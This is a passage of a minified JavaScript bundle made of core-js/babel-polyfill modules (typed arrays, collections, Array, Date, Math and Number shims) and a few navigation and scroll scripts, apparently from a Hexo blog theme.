S(2)),rt=_[m].setInt8;nt.setInt8(0,2147483648),nt.setInt8(1,2147483649),!nt.getInt8(0)&&nt.getInt8(1)||f(_[m],{setInt8:function(t,n){rt.call(this,t,n<<24>>24)},setUint8:function(t,n){rt.call(this,t,n<<24>>24)}},!0)}else S=function(t){var n=$(this,t);this._b=d.call(Array(n),0),this[C]=n},_=function(t,n,r){s(this,_,b),s(t,S,b);var e=t[C],i=l(n);if(i<0||i>e)throw E("Wrong offset!");if(r=void 0===r?e-i:h(r),i+r>e)throw E(x);this[R]=t,this[D]=i,this[C]=r},i&&(J(S,k,"_l"),J(_,I,"_b"),J(_,k,"_l"),J(_,L,"_o")),f(_[m],{getInt8:function(t){return Y(this,1,t)[0]<<24>>24},getUint8:function(t){return Y(this,1,t)[0]},getInt16:function(t){var n=Y(this,2,t,arguments[1]);return(n[1]<<8|n[0])<<16>>16},getUint16:function(t){var n=Y(this,2,t,arguments[1]);return n[1]<<8|n[0]},getInt32:function(t){return G(Y(this,4,t,arguments[1]))},getUint32:function(t){return G(Y(this,4,t,arguments[1]))>>>0},getFloat32:function(t){return W(Y(this,4,t,arguments[1]),23,4)},getFloat64:function(t){return W(Y(this,8,t,arguments[1]),52,8)},setInt8:function(t,n){H(this,1,t,B,n)},setUint8:function(t,n){H(this,1,t,B,n)},setInt16:function(t,n){H(this,2,t,V,n,arguments[2])},setUint16:function(t,n){H(this,2,t,V,n,arguments[2])},setInt32:function(t,n){H(this,4,t,z,n,arguments[2])},setUint32:function(t,n){H(this,4,t,z,n,arguments[2])},setFloat32:function(t,n){H(this,4,t,K,n,arguments[2])},setFloat64:function(t,n){H(this,8,t,q,n,arguments[2])}});y(S,g),y(_,b),c(_[m],u.VIEW,!0),n[g]=S,n[b]=_},function(t,n,r){var e=r(3),i=r(52),o=r(69),u=r(182),c=r(11).f;t.exports=function(t){var n=i.Symbol||(i.Symbol=o?{}:e.Symbol||{});"_"==t.charAt(0)||t in n||c(n,t,{value:u.f(t)})}},function(t,n,r){var e=r(114),i=r(7)("iterator"),o=r(80);t.exports=r(52).getIteratorMethod=function(t){if(void 0!=t)return t[i]||t["@@iterator"]||o[e(t)]}},function(t,n,r){"use strict";var e=r(78),i=r(170),o=r(80),u=r(30);t.exports=r(140)(Array,"Array",function(t,n){this._t=u(t),this._i=0,this._k=n},function(){var t=this._t,n=this._k,r=this._i++;return!t||r>=t.length?(this._t=void 0,i(1)):"keys"==n?i(0,r):"values"==n?i(0,t[r]):i(0,[r,t[r]])},"values"),o.Arguments=o.Array,e("keys"),e("values"),e("entries")},function(t,n){function r(t,n){t.classList?t.classList.add(n):t.className+=" "+n}t.exports=r},function(t,n){function r(t,n){if(t.classList)t.classList.remove(n);else{var r=new RegExp("(^|\\b)"+n.split(" ").join("|")+"(\\b|$)","gi");t.className=t.className.replace(r," ")}}t.exports=r},function(t,n){function r(){throw new Error("setTimeout has not been defined")}function e(){throw new Error("clearTimeout has not been defined")}function i(t){if(s===setTimeout)return setTimeout(t,0);if((s===r||!s)&&setTimeout)return s=setTimeout,setTimeout(t,0);try{return s(t,0)}catch(n){try{return s.call(null,t,0)}catch(n){return s.call(this,t,0)}}}function o(t){if(l===clearTimeout)return clearTimeout(t);if((l===e||!l)&&clearTimeout)return l=clearTimeout,clearTimeout(t);try{return l(t)}catch(n){try{return l.call(null,t)}catch(n){return l.call(this,t)}}}function u(){d&&v&&(d=!1,v.length?p=v.concat(p):y=-1,p.length&&c())}function c(){if(!d){var t=i(u);d=!0;for(var n=p.length;n;){for(v=p,p=[];++y<n;)v&&v[y].run();y=-1,n=p.length}v=null,d=!1,o(t)}}function f(t,n){this.fun=t,this.array=n}function a(){}var s,l,h=t.exports={};!function(){try{s="function"==typeof setTimeout?setTimeout:r}catch(t){s=r}try{l="function"==typeof clearTimeout?clearTimeout:e}catch(t){l=e}}();var v,p=[],d=!1,y=-1;h.nextTick=function(t){var n=new Array(arguments.length-1);if(arguments.length>1)for(var r=1;r<arguments.length;r++)n[r-1]=arguments[r];p.push(new f(t,n)),1!==p.length||d||i(c)},f.prototype.run=function(){this.fun.apply(null,this.array)},h.title="browser",h.browser=!0,h.env={},h.argv=[],h.version="",h.versions={},h.on=a,h.addListener=a,h.once=a,h.off=a,h.removeListener=a,h.removeAllListeners=a,h.emit=a,h.prependListener=a,h.prependOnceListener=a,h.listeners=function(t){return[]},h.binding=function(t){throw new Error("process.binding is not supported")},h.cwd=function(){return"/"},h.chdir=function(t){throw new Error("process.chdir is not supported")},h.umask=function(){return 0}},function(t,n,r){var e=r(45);t.exports=function(t,n){if("number"!=typeof t&&"Number"!=e(t))throw TypeError(n);return+t}},function(t,n,r){"use strict";var e=r(17),i=r(75),o=r(16);t.exports=[].copyWithin||function(t,n){var r=e(this),u=o(r.length),c=i(t,u),f=i(n,u),a=arguments.length>2?arguments[2]:void 0,s=Math.min((void 0===a?u:i(a,u))-f,u-c),l=1;for(f<c&&c<f+s&&(l=-1,f+=s-1,c+=s-1);s-- >0;)f in r?r[c]=r[f]:delete r[c],c+=l,f+=l;return r}},function(t,n,r){var e=r(79);t.exports=function(t,n){var r=[];return e(t,!1,r.push,r,n),r}},function(t,n,r){var e=r(26),i=r(17),o=r(115),u=r(16);t.exports=function(t,n,r,c,f){e(n);var a=i(t),s=o(a),l=u(a.length),h=f?l-1:0,v=f?-1:1;if(r<2)for(;;){if(h in s){c=s[h],h+=v;break}if(h+=v,f?h<0:l<=h)throw TypeError("Reduce of empty array with no initial value")}for(;f?h>=0:l>h;h+=v)h in s&&(c=n(c,s[h],h,a));return c}},function(t,n,r){"use strict";var e=r(26),i=r(6),o=r(121),u=[].slice,c={},f=function(t,n,r){if(!(n in c)){for(var e=[],i=0;i<n;i++)e[i]="a["+i+"]";c[n]=Function("F,a","return new F("+e.join(",")+")")}return c[n](t,r)};t.exports=Function.bind||function(t){var n=e(this),r=u.call(arguments,1),c=function(){var e=r.concat(u.call(arguments));return this instanceof c?f(n,e.length,e):o(n,e,t)};return i(n.prototype)&&(c.prototype=n.prototype),c}},function(t,n,r){"use strict";var e=r(11).f,i=r(70),o=r(73),u=r(53),c=r(68),f=r(46),a=r(79),s=r(140),l=r(170),h=r(74),v=r(10),p=r(65).fastKey,d=v?"_s":"size",y=function(t,n){var r,e=p(n);if("F"!==e)return t._i[e];for(r=t._f;r;r=r.n)if(r.k==n)return r};t.exports={getConstructor:function(t,n,r,s){var l=t(function(t,e){c(t,l,n,"_i"),t._i=i(null),t._f=void 0,t._l=void 0,t[d]=0,void 0!=e&&a(e,r,t[s],t)});return o(l.prototype,{clear:function(){for(var t=this,n=t._i,r=t._f;r;r=r.n)r.r=!0,r.p&&(r.p=r.p.n=void 0),delete n[r.i];t._f=t._l=void 0,t[d]=0},delete:function(t){var n=this,r=y(n,t);if(r){var e=r.n,i=r.p;delete n._i[r.i],r.r=!0,i&&(i.n=e),e&&(e.p=i),n._f==r&&(n._f=e),n._l==r&&(n._l=i),n[d]--}return!!r},forEach:function(t){c(this,l,"forEach");for(var n,r=u(t,arguments.length>1?arguments[1]:void 0,3);n=n?n.n:this._f;)for(r(n.v,n.k,this);n&&n.r;)n=n.p},has:function(t){return!!y(this,t)}}),v&&e(l.prototype,"size",{get:function(){return f(this[d])}}),l},def:function(t,n,r){var e,i,o=y(t,n);return o?o.v=r:(t._l=o={i:i=p(n,!0),k:n,v:r,p:e=t._l,n:void 0,r:!1},t._f||(t._f=o),e&&(e.n=o),t[d]++,"F"!==i&&(t._i[i]=o)),t},getEntry:y,setStrong:function(t,n,r){s(t,n,function(t,n){this._t=t,this._k=n,this._l=void 0},function(){for(var t=this,n=t._k,r=t._l;r&&r.r;)r=r.p;return t._t&&(t._l=r=r?r.n:t._t._f)?"keys"==n?l(0,r.k):"values"==n?l(0,r.v):l(0,[r.k,r.v]):(t._t=void 0,l(1))},r?"entries":"values",!r,!0),h(n)}}},function(t,n,r){var e=r(114),i=r(161);t.exports=function(t){return function(){if(e(this)!=t)throw TypeError(t+"#toJSON isn't generic");return i(this)}}},function(t,n,r){"use strict";var e=r(73),i=r(65).getWeak,o=r(2),u=r(6),c=r(68),f=r(79),a=r(48),s=r(24),l=a(5),h=a(6),v=0,p=function(t){return t._l||(t._l=new d)},d=function(){this.a=[]},y=function(t,n){return l(t.a,function(t){return t[0]===n})};d.prototype={get:function(t){var n=y(this,t);if(n)return n[1]},has:function(t){return!!y(this,t)},set:function(t,n){var r=y(this,t);r?r[1]=n:this.a.push([t,n])},delete:function(t){var n=h(this.a,function(n){return n[0]===t});return~n&&this.a.splice(n,1),!!~n}},t.exports={getConstructor:function(t,n,r,o){var a=t(function(t,e){c(t,a,n,"_i"),t._i=v++,t._l=void 0,void 0!=e&&f(e,r,t[o],t)});return e(a.prototype,{delete:function(t){if(!u(t))return!1;var n=i(t);return!0===n?p(this).delete(t):n&&s(n,this._i)&&delete n[this._i]},has:function(t){if(!u(t))return!1;var n=i(t);return!0===n?p(this).has(t):n&&s(n,this._i)}}),a},def:function(t,n,r){var e=i(o(n),!0);return!0===e?p(t).set(n,r):e[t._i]=r,t},ufstore:p}},function(t,n,r){t.exports=!r(10)&&!r(4)(function(){return 7!=Object.defineProperty(r(132)("div"),"a",{get:function(){return 7}}).a})},function(t,n,r){var e=r(6),i=Math.floor;t.exports=function(t){return!e(t)&&isFinite(t)&&i(t)===t}},function(t,n,r){var e=r(2);t.exports=function(t,n,r,i){try{return i?n(e(r)[0],r[1]):n(r)}catch(n){var o=t.return;throw void 0!==o&&e(o.call(t)),n}}},function(t,n){t.exports=function(t,n){return{value:n,done:!!t}}},function(t,n){t.exports=Math.log1p||function(t){return(t=+t)>-1e-8&&t<1e-8?t-t*t/2:Math.log(1+t)}},function(t,n,r){"use strict";var e=r(72),i=r(125),o=r(116),u=r(17),c=r(115),f=Object.assign;t.exports=!f||r(4)(function(){var t={},n={},r=Symbol(),e="abcdefghijklmnopqrst";return t[r]=7,e.split("").forEach(function(t){n[t]=t}),7!=f({},t)[r]||Object.keys(f({},n)).join("")!=e})?function(t,n){for(var r=u(t),f=arguments.length,a=1,s=i.f,l=o.f;f>a;)for(var h,v=c(arguments[a++]),p=s?e(v).concat(s(v)):e(v),d=p.length,y=0;d>y;)l.call(v,h=p[y++])&&(r[h]=v[h]);return r}:f},function(t,n,r){var e=r(11),i=r(2),o=r(72);t.exports=r(10)?Object.defineProperties:function(t,n){i(t);for(var r,u=o(n),c=u.length,f=0;c>f;)e.f(t,r=u[f++],n[r]);return t}},function(t,n,r){var e=r(30),i=r(71).f,o={}.toString,u="object"==typeof window&&window&&Object.getOwnPropertyNames?Object.getOwnPropertyNames(window):[],c=function(t){try{return i(t)}catch(t){return u.slice()}};t.exports.f=function(t){return u&&"[object Window]"==o.call(t)?c(t):i(e(t))}},function(t,n,r){var e=r(24),i=r(30),o=r(117)(!1),u=r(145)("IE_PROTO");t.exports=function(t,n){var r,c=i(t),f=0,a=[];for(r in c)r!=u&&e(c,r)&&a.push(r);for(;n.length>f;)e(c,r=n[f++])&&(~o(a,r)||a.push(r));return a}},function(t,n,r){var e=r(72),i=r(30),o=r(116).f;t.exports=function(t){return function(n){for(var r,u=i(n),c=e(u),f=c.length,a=0,s=[];f>a;)o.call(u,r=c[a++])&&s.push(t?[r,u[r]]:u[r]);return s}}},function(t,n,r){var e=r(71),i=r(125),o=r(2),u=r(3).Reflect;t.exports=u&&u.ownKeys||function(t){var n=e.f(o(t)),r=i.f;return r?n.concat(r(t)):n}},function(t,n,r){var e=r(3).parseFloat,i=r(82).trim;t.exports=1/e(r(150)+"-0")!=-1/0?function(t){var n=i(String(t),3),r=e(n);return 0===r&&"-"==n.charAt(0)?-0:r}:e},function(t,n,r){var e=r(3).parseInt,i=r(82).trim,o=r(150),u=/^[\-+]?0[xX]/;t.exports=8!==e(o+"08")||22!==e(o+"0x16")?function(t,n){var r=i(String(t),3);return e(r,n>>>0||(u.test(r)?16:10))}:e},function(t,n){t.exports=Object.is||function(t,n){return t===n?0!==t||1/t==1/n:t!=t&&n!=n}},function(t,n,r){var e=r(16),i=r(149),o=r(46);t.exports=function(t,n,r,u){var c=String(o(t)),f=c.length,a=void 0===r?" ":String(r),s=e(n);if(s<=f||""==a)return c;var l=s-f,h=i.call(a,Math.ceil(l/a.length));return h.length>l&&(h=h.slice(0,l)),u?h+c:c+h}},function(t,n,r){n.f=r(7)},function(t,n,r){"use strict";var e=r(164);t.exports=r(118)("Map",function(t){return function(){return t(this,arguments.length>0?arguments[0]:void 0)}},{get:function(t){var n=e.getEntry(this,t);return n&&n.v},set:function(t,n){return e.def(this,0===t?0:t,n)}},e,!0)},function(t,n,r){r(10)&&"g"!=/./g.flags&&r(11).f(RegExp.prototype,"flags",{configurable:!0,get:r(120)})},function(t,n,r){"use strict";var e=r(164);t.exports=r(118)("Set",function(t){return function(){return t(this,arguments.length>0?arguments[0]:void 0)}},{add:function(t){return e.def(this,t=0===t?0:t,t)}},e)},function(t,n,r){"use strict";var e,i=r(48)(0),o=r(28),u=r(65),c=r(172),f=r(166),a=r(6),s=u.getWeak,l=Object.isExtensible,h=f.ufstore,v={},p=function(t){return function(){return t(this,arguments.length>0?arguments[0]:void 0)}},d={get:function(t){if(a(t)){var n=s(t);return!0===n?h(this).get(t):n?n[this._i]:void 0}},set:function(t,n){return f.def(this,t,n)}},y=t.exports=r(118)("WeakMap",p,d,f,!0,!0);7!=(new y).set((Object.freeze||Object)(v),7).get(v)&&(e=f.getConstructor(p),c(e.prototype,d),u.NEED=!0,i(["delete","has","get","set"],function(t){var n=y.prototype,r=n[t];o(n,t,function(n,i){if(a(n)&&!l(n)){this._f||(this._f=new e);var o=this._f[t](n,i);return"set"==t?this:o}return r.call(this,n,i)})}))},,,,function(t,n){"use strict";function r(){var t=document.querySelector("#page-nav");if(t&&!document.querySelector("#page-nav .extend.prev")&&(t.innerHTML='<a class="extend prev disabled" rel="prev">&laquo; Prev</a>'+t.innerHTML),t&&!document.querySelector("#page-nav .extend.next")&&(t.innerHTML=t.innerHTML+'<a class="extend next disabled" rel="next">Next &raquo;</a>'),yiliaConfig&&yiliaConfig.open_in_new){document.querySelectorAll(".article-entry a:not(.article-more-a)").forEach(function(t){var n=t.getAttribute("target");n&&""!==n||t.setAttribute("target","_blank")})}if(yiliaConfig&&yiliaConfig.toc_hide_index){document.querySelectorAll(".toc-number").forEach(function(t){t.style.display="none"})}var n=document.querySelector("#js-aboutme");n&&0!==n.length&&(n.innerHTML=n.innerText)}t.exports={init:r}},function(t,n,r){"use strict";function e(t){return t&&t.__esModule?t:{default:t}}function i(t,n){var r=/\/|index.html/g;return t.replace(r,"")===n.replace(r,"")}function o(){for(var t=document.querySelectorAll(".js-header-menu li a"),n=window.location.pathname,r=0,e=t.length;r<e;r++){var o=t[r];i(n,o.getAttribute("href"))&&(0,h.default)(o,"active")}}function u(t){for(var n=t.offsetLeft,r=t.offsetParent;null!==r;)n+=r.offsetLeft,r=r.offsetParent;return n}function c(t){for(var n=t.offsetTop,r=t.offsetParent;null!==r;)n+=r.offsetTop,r=r.offsetParent;return n}function f(t,n,r,e,i){var o=u(t),f=c(t)-n;if(f-r<=i){var a=t.$newDom;a||(a=t.cloneNode(!0),(0,d.default)(t,a),t.$newDom=a,a.style.position="fixed",a.style.top=(r||f)+"px",a.style.left=o+"px",a.style.zIndex=e||2,a.style.width="100%",a.style.color="#fff"),a.style.visibility="visible",t.style.visibility="hidden"}else{t.style.visibility="visible";var s=t.$newDom;s&&(s.style.visibility="hidden")}}function a(){var t=document.querySelector(".js-overlay"),n=document.querySelector(".js-header-menu");f(t,document.body.scrollTop,-63,2,0),f(n,document.body.scrollTop,1,3,0)}function s(){document.querySelector("#container").addEventListener("scroll",function(t){a()}),window.addEventListener("scroll",function(t){a()}),a()}var l=r(156),h=e(l),v=r(157),p=(e(v),r(382)),d=e(p),y=r(128),g=e(y),b=r(190),m=e(b),x=r(129);(function(){g.default.versions.mobile&&window.screen.width<800&&(o(),s())})(),(0,x.addLoadEvent)(function(){m.default.init()}),t.exports={}},,,,function(t,n,r){(function(t){"use strict";function n(t,n,r){t[n]||Object[e](t,n,{writable:!0,configurable:!0,value:r})}if(r(381),r(391),r(198),t._babelPolyfill)throw new Error("only one instance of babel-polyfill is allowed");t._babelPolyfill=!0;var e="defineProperty";n(String.prototype,"padLeft","".padStart),n(String.prototype,"padRight","".padEnd),"pop,reverse,shift,keys,values,entries,indexOf,every,some,forEach,map,filter,find,findIndex,includes,join,slice,concat,push,splice,unshift,sort,lastIndexOf,reduce,reduceRight,copyWithin,fill".split(",").forEach(function(t){[][t]&&n(Array,t,Function.call.bind([][t]))})}).call(n,function(){return this}())},,,function(t,n,r){r(210),t.exports=r(52).RegExp.escape},,,,function(t,n,r){var e=r(6),i=r(138),o=r(7)("species");t.exports=function(t){var n;return i(t)&&(n=t.constructor,"function"!=typeof n||n!==Array&&!i(n.prototype)||(n=void 0),e(n)&&null===(n=n[o])&&(n=void 0)),void 0===n?Array:n}},function(t,n,r){var e=r(202);t.exports=function(t,n){return new(e(t))(n)}},function(t,n,r){"use strict";var e=r(2),i=r(50),o="number";t.exports=function(t){if("string"!==t&&t!==o&&"default"!==t)throw TypeError("Incorrect hint");return i(e(this),t!=o)}},function(t,n,r){var e=r(72),i=r(125),o=r(116);t.exports=function(t){var n=e(t),r=i.f;if(r)for(var u,c=r(t),f=o.f,a=0;c.length>a;)f.call(t,u=c[a++])&&n.push(u);return n}},function(t,n,r){var e=r(72),i=r(30);t.exports=function(t,n){for(var r,o=i(t),u=e(o),c=u.length,f=0;c>f;)if(o[r=u[f++]]===n)return r}},function(t,n,r){"use strict";var e=r(208),i=r(121),o=r(26);t.exports=function(){for(var t=o(this),n=arguments.length,r=Array(n),u=0,c=e._,f=!1;n>u;)(r[u]=arguments[u++])===c&&(f=!0);return function(){var e,o=this,u=arguments.length,a=0,s=0;if(!f&&!u)return i(t,r,o);if(e=r.slice(),f)for(;n>a;a++)e[a]===c&&(e[a]=arguments[s++]);for(;u>s;)e.push(arguments[s++]);return i(t,e,o)}}},function(t,n,r){t.exports=r(3)},function(t,n){t.exports=function(t,n){var r=n===Object(n)?function(t){return n[t]}:n;return function(n){return String(n).replace(t,r)}}},function(t,n,r){var e=r(1),i=r(209)(/[\\^$*+?.()|[\]{}]/g,"\\$&");e(e.S,"RegExp",{escape:function(t){return i(t)}})},function(t,n,r){var e=r(1);e(e.P,"Array",{copyWithin:r(160)}),r(78)("copyWithin")},function(t,n,r){"use strict";var e=r(1),i=r(48)(4);e(e.P+e.F*!r(47)([].every,!0),"Array",{every:function(t){return i(this,t,arguments[1])}})},function(t,n,r){var e=r(1);e(e.P,"Array",{fill:r(130)}),r(78)("fill")},function(t,n,r){"use strict";var e=r(1),i=r(48)(2);e(e.P+e.F*!r(47)([].filter,!0),"Array",{filter:function(t){return i(this,t,arguments[1])}})},function(t,n,r){"use strict";var e=r(1),i=r(48)(6),o="findIndex",u=!0;o in[]&&Array(1)[o](function(){u=!1}),e(e.P+e.F*u,"Array",{findIndex:function(t){return i(this,t,arguments.length>1?arguments[1]:void 0)}}),r(78)(o)},function(t,n,r){"use strict";var e=r(1),i=r(48)(5),o="find",u=!0;o in[]&&Array(1)[o](function(){u=!1}),e(e.P+e.F*u,"Array",{find:function(t){return i(this,t,arguments.length>1?arguments[1]:void 0)}}),r(78)(o)},function(t,n,r){"use strict";var e=r(1),i=r(48)(0),o=r(47)([].forEach,!0);e(e.P+e.F*!o,"Array",{forEach:function(t){return i(this,t,arguments[1])}})},function(t,n,r){"use strict";var e=r(53),i=r(1),o=r(17),u=r(169),c=r(137),f=r(16),a=r(131),s=r(154);i(i.S+i.F*!r(123)(function(t){Array.from(t)}),"Array",{from:function(t){var n,r,i,l,h=o(t),v="function"==typeof this?this:Array,p=arguments.length,d=p>1?arguments[1]:void 0,y=void 0!==d,g=0,b=s(h);if(y&&(d=e(d,p>2?arguments[2]:void 0,2)),void 0==b||v==Array&&c(b))for(n=f(h.length),r=new v(n);n>g;g++)a(r,g,y?d(h[g],g):h[g]);else for(l=b.call(h),r=new v;!(i=l.next()).done;g++)a(r,g,y?u(l,d,[i.value,g],!0):i.value);return r.length=g,r}})},function(t,n,r){"use strict";var e=r(1),i=r(117)(!1),o=[].indexOf,u=!!o&&1/[1].indexOf(1,-0)<0;e(e.P+e.F*(u||!r(47)(o)),"Array",{indexOf:function(t){return u?o.apply(this,arguments)||0:i(this,t,arguments[1])}})},function(t,n,r){var e=r(1);e(e.S,"Array",{isArray:r(138)})},function(t,n,r){"use strict";var e=r(1),i=r(30),o=[].join;e(e.P+e.F*(r(115)!=Object||!r(47)(o)),"Array",{join:function(t){return o.call(i(this),void 0===t?",":t)}})},function(t,n,r){"use strict";var e=r(1),i=r(30),o=r(67),u=r(16),c=[].lastIndexOf,f=!!c&&1/[1].lastIndexOf(1,-0)<0;e(e.P+e.F*(f||!r(47)(c)),"Array",{lastIndexOf:function(t){if(f)return c.apply(this,arguments)||0;var n=i(this),r=u(n.length),e=r-1;for(arguments.length>1&&(e=Math.min(e,o(arguments[1]))),e<0&&(e=r+e);e>=0;e--)if(e in n&&n[e]===t)return e||0;return-1}})},function(t,n,r){"use strict";var e=r(1),i=r(48)(1);e(e.P+e.F*!r(47)([].map,!0),"Array",{map:function(t){return i(this,t,arguments[1])}})},function(t,n,r){"use strict";var e=r(1),i=r(131);e(e.S+e.F*r(4)(function(){function t(){}return!(Array.of.call(t)instanceof t)}),"Array",{of:function(){for(var t=0,n=arguments.length,r=new("function"==typeof this?this:Array)(n);n>t;)i(r,t,arguments[t++]);return r.length=n,r}})},function(t,n,r){"use strict";var e=r(1),i=r(162);e(e.P+e.F*!r(47)([].reduceRight,!0),"Array",{reduceRight:function(t){return i(this,t,arguments.length,arguments[1],!0)}})},function(t,n,r){"use strict";var e=r(1),i=r(162);e(e.P+e.F*!r(47)([].reduce,!0),"Array",{reduce:function(t){return i(this,t,arguments.length,arguments[1],!1)}})},function(t,n,r){"use strict";var e=r(1),i=r(135),o=r(45),u=r(75),c=r(16),f=[].slice;e(e.P+e.F*r(4)(function(){i&&f.call(i)}),"Array",{slice:function(t,n){var r=c(this.length),e=o(this);if(n=void 0===n?r:n,"Array"==e)return f.call(this,t,n);for(var i=u(t,r),a=u(n,r),s=c(a-i),l=Array(s),h=0;h<s;h++)l[h]="String"==e?this.charAt(i+h):this[i+h];return l}})},function(t,n,r){"use strict";var e=r(1),i=r(48)(3);e(e.P+e.F*!r(47)([].some,!0),"Array",{some:function(t){return i(this,t,arguments[1])}})},function(t,n,r){"use strict";var e=r(1),i=r(26),o=r(17),u=r(4),c=[].sort,f=[1,2,3];e(e.P+e.F*(u(function(){f.sort(void 0)})||!u(function(){f.sort(null)})||!r(47)(c)),"Array",{sort:function(t){return void 0===t?c.call(o(this)):c.call(o(this),i(t))}})},function(t,n,r){r(74)("Array")},function(t,n,r){var e=r(1);e(e.S,"Date",{now:function(){return(new Date).getTime()}})},function(t,n,r){"use strict";var e=r(1),i=r(4),o=Date.prototype.getTime,u=function(t){return t>9?t:"0"+t};e(e.P+e.F*(i(function(){return"0385-07-25T07:06:39.999Z"!=new Date(-5e13-1).toISOString()})||!i(function(){new Date(NaN).toISOString()})),"Date",{toISOString:function(){
if(!isFinite(o.call(this)))throw RangeError("Invalid time value");var t=this,n=t.getUTCFullYear(),r=t.getUTCMilliseconds(),e=n<0?"-":n>9999?"+":"";return e+("00000"+Math.abs(n)).slice(e?-6:-4)+"-"+u(t.getUTCMonth()+1)+"-"+u(t.getUTCDate())+"T"+u(t.getUTCHours())+":"+u(t.getUTCMinutes())+":"+u(t.getUTCSeconds())+"."+(r>99?r:"0"+u(r))+"Z"}})},function(t,n,r){"use strict";var e=r(1),i=r(17),o=r(50);e(e.P+e.F*r(4)(function(){return null!==new Date(NaN).toJSON()||1!==Date.prototype.toJSON.call({toISOString:function(){return 1}})}),"Date",{toJSON:function(t){var n=i(this),r=o(n);return"number"!=typeof r||isFinite(r)?n.toISOString():null}})},function(t,n,r){var e=r(7)("toPrimitive"),i=Date.prototype;e in i||r(27)(i,e,r(204))},function(t,n,r){var e=Date.prototype,i="Invalid Date",o="toString",u=e[o],c=e.getTime;new Date(NaN)+""!=i&&r(28)(e,o,function(){var t=c.call(this);return t===t?u.call(this):i})},function(t,n,r){var e=r(1);e(e.P,"Function",{bind:r(163)})},function(t,n,r){"use strict";var e=r(6),i=r(32),o=r(7)("hasInstance"),u=Function.prototype;o in u||r(11).f(u,o,{value:function(t){if("function"!=typeof this||!e(t))return!1;if(!e(this.prototype))return t instanceof this;for(;t=i(t);)if(this.prototype===t)return!0;return!1}})},function(t,n,r){var e=r(11).f,i=r(66),o=r(24),u=Function.prototype,c="name",f=Object.isExtensible||function(){return!0};c in u||r(10)&&e(u,c,{configurable:!0,get:function(){try{var t=this,n=(""+t).match(/^\s*function ([^ (]*)/)[1];return o(t,c)||!f(t)||e(t,c,i(5,n)),n}catch(t){return""}}})},function(t,n,r){var e=r(1),i=r(171),o=Math.sqrt,u=Math.acosh;e(e.S+e.F*!(u&&710==Math.floor(u(Number.MAX_VALUE))&&u(1/0)==1/0),"Math",{acosh:function(t){return(t=+t)<1?NaN:t>94906265.62425156?Math.log(t)+Math.LN2:i(t-1+o(t-1)*o(t+1))}})},function(t,n,r){function e(t){return isFinite(t=+t)&&0!=t?t<0?-e(-t):Math.log(t+Math.sqrt(t*t+1)):t}var i=r(1),o=Math.asinh;i(i.S+i.F*!(o&&1/o(0)>0),"Math",{asinh:e})},function(t,n,r){var e=r(1),i=Math.atanh;e(e.S+e.F*!(i&&1/i(-0)<0),"Math",{atanh:function(t){return 0==(t=+t)?t:Math.log((1+t)/(1-t))/2}})},function(t,n,r){var e=r(1),i=r(142);e(e.S,"Math",{cbrt:function(t){return i(t=+t)*Math.pow(Math.abs(t),1/3)}})},function(t,n,r){var e=r(1);e(e.S,"Math",{clz32:function(t){return(t>>>=0)?31-Math.floor(Math.log(t+.5)*Math.LOG2E):32}})},function(t,n,r){var e=r(1),i=Math.exp;e(e.S,"Math",{cosh:function(t){return(i(t=+t)+i(-t))/2}})},function(t,n,r){var e=r(1),i=r(141);e(e.S+e.F*(i!=Math.expm1),"Math",{expm1:i})},function(t,n,r){var e=r(1),i=r(142),o=Math.pow,u=o(2,-52),c=o(2,-23),f=o(2,127)*(2-c),a=o(2,-126),s=function(t){return t+1/u-1/u};e(e.S,"Math",{fround:function(t){var n,r,e=Math.abs(t),o=i(t);return e<a?o*s(e/a/c)*a*c:(n=(1+c/u)*e,r=n-(n-e),r>f||r!=r?o*(1/0):o*r)}})},function(t,n,r){var e=r(1),i=Math.abs;e(e.S,"Math",{hypot:function(t,n){for(var r,e,o=0,u=0,c=arguments.length,f=0;u<c;)r=i(arguments[u++]),f<r?(e=f/r,o=o*e*e+1,f=r):r>0?(e=r/f,o+=e*e):o+=r;return f===1/0?1/0:f*Math.sqrt(o)}})},function(t,n,r){var e=r(1),i=Math.imul;e(e.S+e.F*r(4)(function(){return-5!=i(4294967295,5)||2!=i.length}),"Math",{imul:function(t,n){var r=65535,e=+t,i=+n,o=r&e,u=r&i;return 0|o*u+((r&e>>>16)*u+o*(r&i>>>16)<<16>>>0)}})},function(t,n,r){var e=r(1);e(e.S,"Math",{log10:function(t){return Math.log(t)/Math.LN10}})},function(t,n,r){var e=r(1);e(e.S,"Math",{log1p:r(171)})},function(t,n,r){var e=r(1);e(e.S,"Math",{log2:function(t){return Math.log(t)/Math.LN2}})},function(t,n,r){var e=r(1);e(e.S,"Math",{sign:r(142)})},function(t,n,r){var e=r(1),i=r(141),o=Math.exp;e(e.S+e.F*r(4)(function(){return-2e-17!=!Math.sinh(-2e-17)}),"Math",{sinh:function(t){return Math.abs(t=+t)<1?(i(t)-i(-t))/2:(o(t-1)-o(-t-1))*(Math.E/2)}})},function(t,n,r){var e=r(1),i=r(141),o=Math.exp;e(e.S,"Math",{tanh:function(t){var n=i(t=+t),r=i(-t);return n==1/0?1:r==1/0?-1:(n-r)/(o(t)+o(-t))}})},function(t,n,r){var e=r(1);e(e.S,"Math",{trunc:function(t){return(t>0?Math.floor:Math.ceil)(t)}})},function(t,n,r){"use strict";var e=r(3),i=r(24),o=r(45),u=r(136),c=r(50),f=r(4),a=r(71).f,s=r(31).f,l=r(11).f,h=r(82).trim,v="Number",p=e[v],d=p,y=p.prototype,g=o(r(70)(y))==v,b="trim"in String.prototype,m=function(t){var n=c(t,!1);if("string"==typeof n&&n.length>2){n=b?n.trim():h(n,3);var r,e,i,o=n.charCodeAt(0);if(43===o||45===o){if(88===(r=n.charCodeAt(2))||120===r)return NaN}else if(48===o){switch(n.charCodeAt(1)){case 66:case 98:e=2,i=49;break;case 79:case 111:e=8,i=55;break;default:return+n}for(var u,f=n.slice(2),a=0,s=f.length;a<s;a++)if((u=f.charCodeAt(a))<48||u>i)return NaN;return parseInt(f,e)}}return+n};if(!p(" 0o1")||!p("0b1")||p("+0x1")){p=function(t){var n=arguments.length<1?0:t,r=this;return r instanceof p&&(g?f(function(){y.valueOf.call(r)}):o(r)!=v)?u(new d(m(n)),r,p):m(n)};for(var x,w=r(10)?a(d):"MAX_VALUE,MIN_VALUE,NaN,NEGATIVE_INFINITY,POSITIVE_INFINITY,EPSILON,isFinite,isInteger,isNaN,isSafeInteger,MAX_SAFE_INTEGER,MIN_SAFE_INTEGER,parseFloat,parseInt,isInteger".split(","),S=0;w.length>S;S++)i(d,x=w[S])&&!i(p,x)&&l(p,x,s(d,x));p.prototype=y,y.constructor=p,r(28)(e,v,p)}},function(t,n,r){var e=r(1);e(e.S,"Number",{EPSILON:Math.pow(2,-52)})},function(t,n,r){var 